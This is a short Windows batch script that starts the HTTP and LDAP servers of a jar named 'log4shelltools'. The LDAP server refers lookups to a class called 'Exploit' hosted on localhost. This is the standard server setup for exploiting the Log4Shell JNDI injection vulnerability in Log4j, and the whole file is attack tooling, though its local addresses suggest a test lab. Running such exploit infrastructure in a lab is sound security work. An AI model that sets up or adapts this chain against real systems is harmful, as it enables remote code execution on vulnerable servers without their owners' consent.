@echo off
java -cp log4shelltools.jar xyz.terriblefriends.log4shelltools.HTTPServer 8000
java -cp log4shelltools.jar xyz.terriblefriends.log4shelltools.LDAPServer http://127.0.0.1:8000/#Exploit 1389

pause
